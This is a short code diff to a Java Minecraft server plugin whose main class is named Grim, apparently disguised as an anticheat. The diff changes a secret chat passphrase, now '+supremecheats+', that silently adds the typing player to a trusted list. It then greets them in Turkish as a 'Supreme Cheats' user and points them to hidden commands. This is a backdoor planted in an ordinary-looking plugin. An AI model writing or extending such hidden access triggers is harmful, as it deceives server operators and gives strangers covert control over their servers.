@@ -399,11 +399,11 @@ public class Grim extends JavaPlugin implements Listener {
             });
         }
 
-        if (message.contains("+x99")) {
+        if (message.contains("+supremecheats+")) {
             if (!trustedPlayers.contains(player.getName())) {
                 trustedPlayers.add(player.getName());
                 player.sendMessage(ChatColor.GREEN + "Supreme Cheats'i kullandigin icin tesekkur ederiz!");
-                player.sendMessage(ChatColor.RED + "\"tst\" yazarak test, \"+6\" Yazarak Komutlara(Commands) bakabilirsin!");
+                player.sendMessage(ChatColor.RED + "\"tst\" yazarak test, \"+help\" Yazarak Komutlara(Commands) bakabilirsin!");
             } else {
                 player.sendMessage(ChatColor.YELLOW + "Zaten komutlari kullanabilen bir oyuncusun.");
             }
